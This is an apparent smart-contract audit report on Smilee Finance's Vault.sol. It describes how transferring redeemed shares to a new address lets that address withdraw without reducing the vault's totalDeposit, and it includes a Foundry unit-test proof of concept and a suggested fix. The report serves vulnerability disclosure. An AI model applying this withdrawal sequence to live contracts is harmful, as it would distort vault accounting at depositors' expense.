# `Vault._state.liquidity.totalDeposit` can avoid being decreased.

## Summary
`Vault._state.liquidity.totalDeposit` is used as total deposit amount of `baseToken` in `Vault.sol`, when user deposits into `Vault.sol`, it will be increased, and when users withdraws it will be decreased. 
In current implementation, there is a code path that a user can withdraw token from the vault without decreasing `Vault._state.liquidity.totalDeposit`.

## Vulnerability Detail
When user calls `Vault.redeem`, the function will transfer [ERC20 token](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L443) to the caller.
And when the user calls `Vault.initiateWithdraw`, [Vault._initiateWithdraw](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L455-L518) will update [_state.liquidity.totalDeposit](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L509)

In [Vault.sol#L507](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L507), `withdrawDepositEquivalent` is calculated as `uint256 withdrawDepositEquivalent = (userDeposits * shares) / userShares;`

And in [Vault.sol#L502](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L502), `userDeposits` is assigned by `depositReceipt.cumulativeAmount`
So if `depositReceipt.cumulativeAmount` is **0**, `withdrawDepositEquivalent` will be **0**, and `_state.liquidity.totalDeposit` will keep unchanged after [Vault.sol#L509](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L509C9-L509C38)

It's doable by:
1. Alice call `Vault.redeem` to withdraw some token, during `Vault._redeem`, some ERC20 will be transferred to Alice
1. Alice transfers the ERC20 token to Bob(who is never interact with the Vault before)
1. after the epoch, Bob will calls `Vault.initiateWithdraw` to withdraw the baseToken, in such case, because of [depositReceipt](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L500C41-L500C55) is zero, [userDeposits](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L502C17-L502C29)will be zero, and leaving [_state.liquidity.totalDeposit](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/3241f1bf0c8e951a41dd2e51997f64ef3ec017bd/smilee-v2-contracts/src/Vault.sol#L509) unchanged.
1. Bob calls `Vault.completeWithdraw` to withdraw the token

After the call, Bob will receives all the asset he deserves, but leaving `_state.liquidity.totalDeposit` unchanged.

For POC, add the following code to `unit/Vault.user.t.sol` and run `forge test --mc VaultUserTest --mt testTransferCompleteWithdraw -vv`

```solidity
    function testTransferCompleteWithdraw() public {
        uint256 totalDeposit     = 10000*1e6;
        uint256 sharesToWithdraw = 5000*1e6;
        uint256 sideTokenPrice   = 1e18;


        address alice = address(0x1111);
        address bob   = address(0x2222);

        // User deposit (and later withdraw) a given amount
        vm.prank(admin);
        baseToken.mint(alice, sharesToWithdraw);

        vm.startPrank(alice);
        baseToken.approve(address(vault), sharesToWithdraw);
        vault.deposit(sharesToWithdraw, alice, 0);
        vm.stopPrank();

        vm.warp(vault.getEpoch().current + 1);
        vm.prank(admin);
        vault.rollEpoch();

        vm.prank(alice);
        vault.redeem(sharesToWithdraw);

        vm.prank(alice);
        vault.transfer(bob, sharesToWithdraw);

        {
            (, , uint256 pendingWithdrawals, , uint256 totalVaultDeposit, uint256 heldShares, uint256 newHeldShares, , ) = vault.vaultState();
            console2.log("totalVaultDeposit                     :", totalVaultDeposit);
            console2.log("baseToken.balanceOf(bob)              :", baseToken.balanceOf(bob));
        }

        vm.prank(bob);
        vault.initiateWithdraw(sharesToWithdraw);

        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), sideTokenPrice);


        vm.warp(vault.getEpoch().current + 1);
        vm.prank(admin);
        vault.rollEpoch();

        uint256 sharePrice = vault.epochPricePerShare(vault.getEpoch().previous);

        vm.prank(bob);
        vault.completeWithdraw();

        {
            (, , uint256 pendingWithdrawals, , uint256 totalVaultDeposit, uint256 heldShares, uint256 newHeldShares, , ) = vault.vaultState();
            console2.log("totalVaultDeposit                     :", totalVaultDeposit);
            console2.log("baseToken.balanceOf(bob)              :", baseToken.balanceOf(bob));
        }

    }
```

## Impact
By abusing this method, Vault will handle less `baseToken` than expected

## Recommendation
Maybe we can revert in `Vault.transfer/transferFrom`
